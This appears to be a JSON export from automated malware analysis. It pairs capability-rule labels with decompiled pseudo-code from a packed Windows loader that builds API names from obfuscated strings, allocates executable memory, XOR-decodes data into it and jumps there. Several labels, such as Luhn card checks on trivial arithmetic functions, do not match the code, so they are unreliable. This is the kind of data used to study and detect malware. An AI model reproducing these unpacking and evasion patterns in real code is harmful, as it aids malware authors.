{
    "00401000": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00401000(void)\n\n{\n    uint var_6d8h;\n    uint var_608h;\n    uint var_517h;\n    uint var_4h;\n    \n    // [00] -r-x section size 192512 named .text\n    return *(*0x43023c + -4);\n}\n",
        "token_count": 72
    },
    "null": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00403b06)\n\nuint entry0(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_8h_2;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint hWinSta;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint nVirtKey;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint hWnd;\n    uint var_50h;\n    uint32_t bConvert;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint vKey;\n    uint var_18h;\n    uint hDC;\n    uint nIndex;\n    uint hIcon;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.GDI32.dll_AddFontResourceW)(L\"124124124124124\");\n    (*_sym.imp.GDI32.dll_GetEnhMetaFileW)(L\"412412512512512\");\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (iVar1 == 2) {\n        for (bConvert = 0; bConvert < 0x172e5; bConvert = bConvert + 1) {\n            (*_sym.imp.USER32.dll_GetKeyState)(1);\n            (*_sym.imp.USER32.dll_CloseWindowStation)(1);\n        }\n        (*_sym.imp.USER32.dll_GetWindowTextLengthW)(1);\n        (*_sym.imp.USER32.dll_IsCharUpperW)(bConvert & 0xffff);\n        (*_sym.imp.USER32.dll_IsGUIThread)(bConvert);\n        (*_sym.imp.USER32.dll_GetTopWindow)(bConvert);\n        (*_sym.imp.USER32.dll_DestroyMenu)(bConvert);\n        (*_sym.imp.GDI32.dll_GetObjectType)(1);\n        (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        (*_sym.imp.USER32.dll_EndMenu)();\n        (*_sym.imp.GDI32.dll_GetPixelFormat)(1);\n        (*_sym.imp.USER32.dll_IsCharLowerA)(1);\n        (*_sym.imp.GDI32.dll_DeleteObject)(bConvert);\n        (*_sym.imp.GDI32.dll_GetROP2)(1);\n        (*_sym.imp.USER32.dll_PaintDesktop)(1);\n        (*_sym.imp.USER32.dll_GetInputState)();\n        (*_sym.imp.GDI32.dll_DeleteDC)(1);\n        (*_sym.imp.GDI32.dll_GetObjectType)(bConvert);\n        (*_sym.imp.USER32.dll_DestroyCursor)(bConvert);\n        (*_sym.imp.USER32.dll_IsCharLowerA)(bConvert & 0xff);\n        (*_sym.imp.GDI32.dll_GetDCPenColor)(bConvert);\n        (*_sym.imp.GDI32.dll_GetColorSpace)(1);\n        *0x430238 = var_8h_2;\n        *0x430220 = &stack0xfffffffc;\n        fcn.004013c0();\n        fcn.00401570();\n        *0x43020c = fcn.00401000(0x15);\n        fcn.004014b0(0x7e45);\n        while (*0x4318cc = fcn.00403b50(*0x430224, *0x430210),  *0x43022c < *0x43020c) {\n            fcn.00403b80(0xd120);\n            *0x430214 = *0x4318cc;\n            *0x430230 = *0x430228 + *0x430224 + *0x430230;\n            *0x43022c = *0x430224 + *0x43022c;\n            *0x430210 = *0x430210 - *0x4318cc;\n        }\n        fcn.00401320(0x37, 0x3043);\n        uVar6 = 1;\n        uVar4 = 1;\n        uVar2 = 1;\n        uVar8 = 1;\n        uVar7 = 1;\n        uVar5 = 1;\n        uVar3 = 1;\n        puVar9 = *0x430220;\n        (*_sym.imp.USER32.dll_DestroyIcon)(1, 1, 1, 1, 1, 1, 1, 1, *0x430220, &stack0xfffffffc);\n        (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        (*_sym.imp.GDI32.dll_DeleteColorSpace)(uVar7);\n        (*_sym.imp.USER32.dll_WindowFromDC)(uVar5);\n        (*_sym.imp.GDI32.dll_GetPixelFormat)(uVar3);\n        (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        (*_sym.imp.USER32.dll_GetDC)(uVar5);\n        (*_sym.imp.USER32.dll_IsIconic)(uVar7);\n        (*_sym.imp.USER32.dll_ReleaseCapture)();\n        (*_sym.imp.USER32.dll_GetInputState)();\n        (*_sym.imp.GDI32.dll_GdiFlush)();\n        (*_sym.imp.USER32.dll_EndMenu)();\n        (*_sym.imp.GDI32.dll_FlattenPath)(uVar2);\n        (*_sym.imp.USER32.dll_GetWindowDC)(uVar7);\n        (*_sym.imp.USER32.dll_GetSysColorBrush)(uVar6);\n        (*_sym.imp.USER32.dll_DrawMenuBar)(uVar8);\n        (*_sym.imp.GDI32.dll_GetStockObject)(uVar4);\n        (*_sym.imp.GDI32.dll_CloseMetaFile)(uVar7);\n        (*_sym.imp.USER32.dll_GetDC)(uVar4);\n        (*_sym.imp.GDI32.dll_GetDCPenColor)(uVar4);\n        (*_sym.imp.USER32.dll_IsWindowUnicode)(uVar7);\n        (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        (*_sym.imp.GDI32.dll_DeleteEnhMetaFile)(uVar4);\n        (*_sym.imp.GDI32.dll_GetEnhMetaFileA)(\"OGCYBDtrsh\");\n        (*_sym.imp.USER32.dll_CharLowerA)(\"bHuYOhQMoY\");\n        (*_sym.imp.GDI32.dll_CreateMetaFileA)(0x43031c);\n        (*_sym.imp.GDI32.dll_CreateMetaFileA)(0x430320);\n        (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        (*_sym.imp.GDI32.dll_UpdateColors)(uVar4);\n        (*_sym.imp.USER32.dll_GetAsyncKeyState)(uVar3);\n        *puVar9 = *0x430234;\n        puVar9[-1] = *0x430218;\n    // WARNING: Could not recover jumptable at 0x00403e13. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**0x43021c)();\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 1752
    },
    "004013c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004013c0(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint lpLibFileName;\n    uint var_8h;\n    uint var_4h;\n    \n    str.5dv1pi32[0] = 'a';\n    str.5dv1pi32[3] = 'a';\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"5dv1pi32\", \"RegOpenKeyA\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    **0x43027c = 0x69;\n    iVar3 = (*pcVar2)(*0x430244 + -2, *0x43027c, 0x4318e8);\n    if (iVar3 == 0) {\n        *0x4318ec = _sym.imp.ADVAPI32.dll_RegQueryValueExA;\n        *0x43023c = fcn.00401050();\n        return;\n    }\n    do {\n    // WARNING: Do nothing block with infinite loop\n    } while( true );\n}\n",
        "token_count": 250
    },
    "00401050": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00401050(void)\n\n{\n    int32_t iVar1;\n    uint var_d8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x430234 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x430284 = *0x430284 - 1;\n    *0x4318e4 = *0x430234 + *0x4318e0;\n    *0x4318e0 = *(*0x430234 + 0x3c);\n    var_ch = 200;\n    var_8h = 1;\n    var_4h = *0x4318e8;\n    while (iVar1 = (**0x4318ec)(var_4h, 0x4318dc, 0, &var_8h, &var_d8h, &var_ch),  iVar1 != 0) {\n        fcn.00401050();\n    }\n    iVar1 = (**0x430280)(0xb96b);\n    if ((*0x430234 < *0x430284) && (*0x430284 < *0x430234 + *(*0x4318e4 + 0x50) + *0x4318d8 * 4)) {\n        *0x430218 = *0x4318d8;\n    }\n    else {\n        *0x430234 = *0x430238;\n    }\n    *0x4318f0 = iVar1 + 0x4040d8;\n    *0x4318f4 = *(*0x4318e4 + 0x50);\n    return iVar1 + 0x4040d8;\n}\n",
        "token_count": 380
    },
    "00401240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401240(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    return arg_8h * 0x7a;\n}\n",
        "token_count": 43
    },
    "00401260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401260(void)\n\n{\n    *0x4318fc = *0x4318f8;\n    *0x43190c = **0x4318f8;\n    *0x431904 = *0x431900 - 0x21;\n    *0x431908 = *0x43190c ^ *0x431900;\n    **0x4318f8 = *0x431908;\n    return;\n}\n",
        "token_count": 100
    },
    "00401320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401320(void)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    while (var_4h < *0x43020c) {\n        *0x431910 = *0x430240 + var_4h;\n        fcn.00401450(0x379, var_4h);\n        *0x431900 = var_4h + 0x1a70;\n        *0x4318f8 = *0x431910;\n        var_4h = var_4h + 4;\n        fcn.00401260();\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "00401450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401450(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    piVar1 = *0x431910;\n    iVar2 = (**0x430280)(0x108c1);\n    iVar3 = (**0x430280)(0x108c1);\n    *piVar1 = arg_ch + 0x12792 + iVar2 + iVar3 + *piVar1;\n    *piVar1 = *piVar1 + -0x12792;\n    return;\n}\n",
        "token_count": 144
    },
    "00403b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00403b80(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = *0x430240 + *0x43022c;\n    iVar11 = *0x43023c + *0x430230;\n    for (var_8h = 0; var_8h < *0x4318cc; var_8h = var_8h + 1) {\n        iVar2 = (**0x430280)(0x1150);\n        iVar3 = (**0x430280)(0x1150);\n        iVar4 = (**0x430280)(0x1150);\n        iVar5 = (**0x430280)(0x1150);\n        iVar6 = (**0x430280)(0x1150);\n        iVar7 = (**0x430280)(0x30e0);\n        iVar8 = (**0x430280)(0x1150);\n        iVar9 = (**0x430280)(0xd6978);\n        iVar10 = (**0x430280)(0x6d06f);\n        *(iVar10 + iVar1 + iVar7 + var_8h + iVar8 + iVar9) = *(iVar11 + iVar2 + var_8h + iVar3 + iVar4 + iVar5 + iVar6);\n    }\n    return;\n}\n",
        "token_count": 387
    },
    "00403b50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403b50(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < arg_ch) {\n        arg_ch = arg_8h;\n    }\n    return arg_ch;\n}\n",
        "token_count": 72
    },
    "004014b0": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nint32_t fcn.004014b0(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x43020c;\n    str.2irtualAllocEx[0] = 'V';\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"kernel32\", \"2irtualAllocEx\", \"2irtualAllocEx\", *0x43020c);\n    *0x431914 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    *0x430240 = (**0x431914)(0xffffffff, 0, uVar1, 0x3000, 0x40);\n    *0x430210 = *0x43020c;\n    *0x43021c = *0x430240 + 0x29dc0;\n    return *0x430240;\n}\n",
        "token_count": 273
    }
}